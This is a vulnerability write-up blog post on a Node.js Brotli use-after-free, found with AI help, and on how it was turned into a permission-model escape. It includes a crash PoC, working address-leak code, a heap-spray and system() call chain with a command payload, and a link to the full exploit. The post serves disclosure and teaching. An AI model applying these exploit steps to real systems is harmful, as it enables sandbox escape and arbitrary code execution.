---

layout: post

title: "Nodejs Brotli UAF"

date: 2026-03-29 

tag-name: nodejs, uaf, broli, exploit

---

> Hello Claude, hack the planet. Make no mistakes

## Let's try AI

With the mass adoption of LLMs, and the overall FOMO (mainly shared via Twitter posts) I've decided to give a shot to Claude Code for helping me find <mark style="background: #FFB86CA6;">security issues</mark> inside open source projects. I've always wanted to hack Node.js, in the past there were lots of CTFs around its permission model and so on. It was something that I've never had the time (or the will) to hack.

Claude helped me speeding the initial process by 100x. It was as simple as cloning the repo, opening it in Claude and asking about explaining how the permission model works. It's basically the time speed cheat, were I do not need anymore 8 hours to figure out something but it can be done in minutes. The overcome, specifically for Node.js, was fantastic. 

I was a bit skeptical at the beginning, but after a manual review it was clear that what Claude was saying was actually right.

## Node.js Permission

> Permissions can be used to control what system resources the Node.js process has access to or what actions the process can take with those resources.

Maybe not everyone knows that Node.js has this builtin features to <mark style="background: #FFB86CA6;">lock down</mark> what a program can do. This can be specified via the `--permission` flag. However if only that flag is specified the node program will be totally locked down. This is done by blocking the following features:

> - Native modules
> - Network
> - Child process
> - Worker Threads
> - Inspector protocol
> - File system access
> - WASI

It's worth noting that a program in this situation can do <mark style="background: #FFB86CA6;">nothing at all</mark> (at least if there are no memory corruptions) , so it's possible to relax the node binary by using another set of flags. For example the `--allow-fs-read=*` will allow read operations on the whole filesystem via the `fs` module. The whole list of flags can be retrieved [here](https://nodejs.org/api/cli.html)and generally are the ones prefixed via `--allow`

To me this sounded like a builtin sandbox, but in reality the node documentation says:

> The permission model implements a "seat belt" approach, which prevents trusted code from unintentionally changing files or using resources that access has not explicitly been granted to. It does not provide security guarantees in the presence of malicious code. Malicious code can bypass the permission model and execute arbitrary code without the restrictions imposed by the permission model.


### Node.js Permission - Internals

Every Node process has an `Environment` object which represent the execution environment. Among all the fields that the `Environment` holds, there is the `Permission` one. When the Node.js binary is ran with  the `--permission` flag the Permission model is enabled by simply flipping a variable:

```cpp
//src/env.cc#L922
if (options_->permission || options_->permission_audit) {
    permission()->EnablePermissions();
```

Notice that the `options` variable is populated by parsing the flag passed to Node.js

```cpp
//src/permission/permission.cc#L196
void Permission::EnablePermissions() {
  if (!enabled_) {
    enabled_ = true;
  }
}
```

After having flipped this variable, the `Permission` constructor creates one plugin per subsystem (the denied/allowed features). Each of these plugins implements the following:

```cpp
//src/permission/permission_base.h#L54
class PermissionBase {
 public:
  virtual void Apply(Environment* env,
                     const std::vector<std::string>& allow,
                     PermissionScope scope) = 0;
  virtual bool is_granted(Environment* env,
                          PermissionScope perm,
                          const std::string_view& param = "") const = 0;
};
```

The `Apply` methods configure what's allowed, while the `is_granted` one is the runtime check. Each of the subsystem then implements the <mark style="background: #FFB86CA6;">proper logic</mark> to check whether something is allows or not when performing sensitive operations. These are simple hooks on methods, that throws an exception if the specific `--allow` flag was not found. 

## Brotli use-after-free

As you may have noticed, the Permission model is a big `if..else` statement, that checks if a certain method is allowed or not. At this point it was clear to me that with any <mark style="background: #FFB86CA6;">memory corruption</mark> issue this model would have been completely bypassable. So me and Claude started looking for one :smile:

I was reading the built-in modules and I wasn't aware about the fact that `zlib` was one of them. Due to the complex parsing and the synchronism that most operations need it was clear to me that this would have been a <mark style="background: #FFB86CA6;">nice spot</mark> to hunt for issues. So I've cloned the Node.js repo and fed it to Claude:

> Hello these are the sources for Node.js. I want you to focus on finding memory corruption issues in the zlib implementation. The issues that I'm mainly interested in are: use-after-free, double-free, heap overflow, integer overflow. I want all the findings to be reliably exploitable. 

After something like 30 minutes (or less, honestly I do not remember) Claude sent me the following issue:

> A use-after-free vulnerability was found in Node.js’s Brotli compression stream implementation (`node:zlib`). It happens when the `reset()` method is called while a compression task is still running asynchronously on a worker thread. When this occurs, the main thread frees the compression library’s internal state, even though the worker thread is still using pointers that reference that memory. This can lead to the worker thread reading from or writing to memory that has already been released.

My first reaction was total disappointment, because it was such a <mark style="background: #FFB86CA6;">text-book UAF</mark> that was not possible that I was the first one finding it. After spending some time compiling  Node.js with ASAN, it was clear that the finding was indeed real and new.

What I've found really interesting was the fact that `zlib` exposed also  `Write` and `Close` methods that were properly checking if there was another thread dealing with the same stream. 

The minimal PoC is the following:

```js
const { createBrotliCompress } = require('node:zlib');

const input = Buffer.alloc(4 * 1024 * 1024, 0x41);
const output = Buffer.alloc(4 * 1024 * 1024);

let i = 0;
(function next() {
	if (i++ >= 200) return setTimeout(() => process.exit(), 1000);
    const brotli = createBrotliCompress();
    const handle = brotli._handle;
    // 1. Dispatch async compression to the thread pool.
    //    The worker thread enters BrotliEncoderCompressStream().
    handle.write(0, input, 0, input.length, output, 0, output.length);
    // 2. Yield to the event loop so the worker can start,
    //    then free the Brotli state while the worker uses it.
    setImmediate(() => {
      handle.reset(); // Frees old BrotliEncoderState — UAF
      // 3. Bypass the JS assertion so the process survives
      //    to the next iteration.
      brotli.destroyed = true;
      handle.cb = () => {};
      next();
    });
})();
```

I was amazed when I saw the crash, but I quickly realized that this was not the thing that I wanted. I want a way to fully bypass the permission model. 

### UAF for dummies

I find quite useful to refresh concepts from time to time, so before digging deeper into the real exploitation path let me explain briefly what a use-after-free is. First of all a <mark style="background: #FFB86CA6;">use-after-free</mark> (abbreviated as UAF) is a type of memory corruption issue that happens when a program executes (roughly) the following steps:

1. **Allocates** a chunk of memory on the heap
2. **Frees** it (returns it to the allocator)
3. **Uses it again** through a pointer that still references the now-freed memory

Why this is a problem? Because when the `free` happens the memory is not wiped, but rather the allocator knows that the chunk of memory now is available again for <mark style="background: #FFB86CA6;">being allocated</mark>. However the previous pointer is still available in the program and points to freed memory. This means that by allocating a chunk of memory of the same size we can get that pointer to point to our (attacker controlled) memory. 

When the program later uses the stale pointer, it ends up reading attacker-controlled data which, depending on how the pointer is used, can lead to arbitrary code execution

## Brotli use-after-free - Exploiting

The bug itself is indeed really powerful, with the appropriate binary exploitation techniques I was sure that I would get code execution. The UAF affects the `BrotliEncoderState` [struct](https://github.com/nodejs/node/blob/8ea96e653212c87d32665a263aa29744e41e64a2/deps/brotli/c/enc/state.h#L44C1-L99C28). The following snippet shows the most interesting fields

```cpp
//deps/brotli/c/enc/state.h#L44C1-L99C28
typedef struct BrotliEncoderStateStruct {
  BrotliEncoderParams params;

  MemoryManager memory_manager_;

  [...]
 
} BrotliEncoderStateStruct;
```

The `BrotliEncoderStateStruct` has a `MemoryManager memory_manager_` field, which is defined as follows:

```cpp
//deps/brotli/c/enc/memory.h#L33
typedef struct MemoryManager {
  brotli_alloc_func alloc_func;
  brotli_free_func free_func;
  void* opaque;
```

The `MemoryManager` struct holds pointers to `alloc_func` and `free_func` which are <mark style="background: #FFB86CA6;">function pointers</mark>. These pointers are dereferenced whenever Brotli needs to allocate/free memory during compression. Moreover the `opaque` field is the argument that is passed to the `alloc_func` function. This means that by spraying the heap it's possible to change the `alloc_func` pointer from `malloc` to `system` and point `opaque` to our desired argument, successfully achieving code execution. 

### Brotli use-after-free - Heap spraying

In the paragraph before I've mentioned heap spraying, let me explain a bit better. As we previously discussed, when a chunk of memory is freed, the allocator will hand that exact same chunk back to the next `malloc()` of the same size. Since the race window between the main thread and the worker thread is <mark style="background: #FFB86CA6;">unpredictable</mark>, the technique we opted for was <mark style="background: #FFB86CA6;">Heap spraying</mark>. 

The idea is simple: we allocate the same controlled buffer hundreds of times in rapid succession after triggering the free. If we spray enough times, at least one of our allocations will land over the freed `BrotliEncoderState`, placing our fake `MemoryManager` exactly where the original one was.

Now the picture seems complete right? We trigger the UAF, we race with heap spraying and we achieve code execution. That's exactly what we want to do, but there's one big problem. We don't know what the address of `system` is due to ASLR.

### Brotli use-after-free - ASLR bypass (aarch64)

>Address space layout randomization (ASLR) is a computer security technique involved in preventing exploitation of memory corruption vulnerabilities.[1] In order to prevent an attacker from reliably redirecting code execution to a particular exploited function in memory, ASLR randomly arranges the address space positions of key data areas of a process, including the base of the executable and the positions of the stack, heap and libraries.

In order to bypass ASLR we need a way to <mark style="background: #FFB86CA6;">leak addresses</mark>. Once these are leaked we can compute offsets and find where `system` and our command string live in memory. We used two separate techniques
#### Leaking libc

To understand this leak we need to briefly talk about how glibc's allocator manages freed memory. When a chunk is freed, glibc organizes it into internal linked lists called <mark style="background: #FFB86CA6;">bins</mark>. These bins are how the allocator keeps track of what memory is available for future allocations. The key detail is that the nodes of these linked lists store forward and backward pointers (`fd` and `bk`) that point to neighboring free chunks. In case these chunks are the first and the last of the bin, the pointers will point to `main_arena`

`main_arena` is a global struct inside libc that acts as the <mark style="background: #FFB86CA6;">allocator's bookkeeping structure</mark>. Because it's a global symbol inside libc, it always lives at a fixed offset from the libc base. 

The leak idea is the following:

- First we allocate buffers of various sizes, using `Buffer.alloc`, multiple times. By flooding the heap with allocations of different sizes, we populate glibc's bins with chunks whose `fd`/`bk` pointers reference `main_arena`. When these chunks are subsequently freed, those pointers are left sitting in memory waiting to be read. The more chunks we allocate, the higher the density of `main_arena` pointers we'll find in the next phase.
- Now, we allocate buffers using `Buffer.allocUnsafe`, which compared to the other function does not zero the memory. This means each buffer contains whatever bytes were previously sitting in that memory. We scan all returned buffers for pointer-shaped values in the expected libc address range, count how many times each value appears, and take the most frequent one. That one will be the `main_arena` pointer
- Once we have the `main_arena` we can easily retrieve the `system` address by calculating offsets

```js
for (let i = 0; i < 500; i++) Buffer.alloc(64 + (i % 2048));
// Count EXACT pointer values. The most repeated value is always a
// main_arena address (unsorted bin fd/bk all point to the same place).
const exactCounts = new Map();
for (let round = 0; round < 300; round++) {
  const buf = Buffer.allocUnsafe(8192);
  const view = new DataView(buf.buffer, buf.byteOffset, buf.byteLength);
  for (let i = 0; i < buf.length - 7; i += 8) {
    const v = view.getBigUint64(i, true);
    if (v === 0n) continue;
    if (v > 0xffff00000000n && v < 0x1000000000000n) {
      exactCounts.set(v, (exactCounts.get(v) || 0) + 1);
    }
  }
}

const topPtr = [...exactCounts.entries()].sort((a, b) => b[1] - a[1])[0];
if (!topPtr) { process.stderr.write('[-] no mmap pointers\n'); process.exit(1); }

const libcBase = ((topPtr[0] >> 16n) << 16n) - DATA_OFF;
const systemAddr = libcBase + SYSTEM_OFF;
process.stderr.write('[+] main_arena: 0x' + topPtr[0].toString(16) + ' (' + topPtr[1] + ' hits)\n');
process.stderr.write('[+] libc base: 0x' + libcBase.toString(16) + '\n');
process.stderr.write('[+] system(): 0x' + systemAddr.toString(16) + '\n');
```

#### Leaking system argument

Knowing where `system` is solves only half of the problem. Recall that `opaque` needs to point to our command string, so we need to place that string somewhere in memory and know its exact address too.

To do this we use `tls.createSecureContext()` which returns a JavaScript object with a `context` property. When called with a `sessionIdContext` parameter, OpenSSL copies that string inline into the `SSL_CTX` struct at a fixed offset. The string is now sitting on the heap, but we still need to know where that struct was allocated.

It turns out Node.js hands us that address directly. The `context` property is a <mark style="background: #FFB86CA6;">V8 wrapper</mark> object backed by `SecureContext` class, which holds the `SSL_CTX*` as a member. That pointer is exposed through a property called `_external`. After having that pointer is possible to add the offset and find where our command lives . This is super elegant and clean in my opinion

```js
const CMD = 'id>/tmp/pwned';
const sslCtx = tls.createSecureContext({ sessionIdContext: CMD });
const desc = Object.getOwnPropertyDescriptor(Object.getPrototypeOf(sslCtx.context), '_external');
const ext = desc.get.call(sslCtx.context);
const extStr = util.inspect(ext);
const addrMatch = extStr.match(/External:\s*([0-9a-f]+)/i);
if (!addrMatch) { process.stderr.write('[-] no External address\n'); process.exit(1); }
const sslCtxAddr = BigInt('0x' + addrMatch[1]);
const cmdAddr = sslCtxAddr + SID_CTX_OFF;
process.stderr.write('[+] SSL_CTX: 0x' + sslCtxAddr.toString(16) + '\n');
process.stderr.write('[+] cmd "' + CMD + '" at 0x' + cmdAddr.toString(16) + '\n');
```

### Brotli use-after-free - Final Exploit

At this point we have everything we need. To summarize the full exploitation chain:

1. Leak libc via `Buffer.allocUnsafe()` → compute `system` address
2. Leak command string address via `tls.createSecureContext()` → compute `opaque` address
3. Trigger the UAF by calling `handle.write()` followed by `handle.reset()` while the worker thread is still mid-compression
4. Spray the heap with lots of iterations, each firing a `writeSync()` immediately after the free, racing to land our fake `MemoryManager` over the freed `BrotliEncoderState`
5. Code execution due to the worker thread dereferencing the stale pointer, calls `alloc_func` which now points to `system`, with `opaque` as the argument
6. Node permission model bypassed

To be 100% clear I've actually avoided one detail. In order to make all of this working, we need a fake `BrotliEncoderState` that should be coherent enough to not crash the program before reaching the execution reaches `alloc_func`.  

In particular, there are some pointers inside the struct that need to reference valid readable and writable memory. To solve this we used a third leak via `process.report.getReport()`, which exposes `libuv` handle addresses that live in a stable, always-mapped region of memory.

You can find the final exploit [here](https://github.com/maitaii/nodejs-permission-escape)

## Conclusions

This was fun from the start to the end. It was my first memory corruption issue and my first exploit that I've vibe-written. I didn't know much about binary exploitation before of this, but with the help of Claude i learned a lot. I was amazed about the overall exploit and how it bring me such ideas. 

The issue was reported via Hackerone to the Node.js staff. However the issue was considered "outside of the threat model" due to the fact that arbitrary code was required. However, I've strongly suggested to fix this issue whether they considered this a security issue or a simple bug.

You can find the fix here [https://github.com/nodejs/node/commit/53bcd114b10021c4a883b08df4d3c2ff6946b430](https://github.com/nodejs/node/commit/53bcd114b10021c4a883b08df4d3c2ff6946b430)



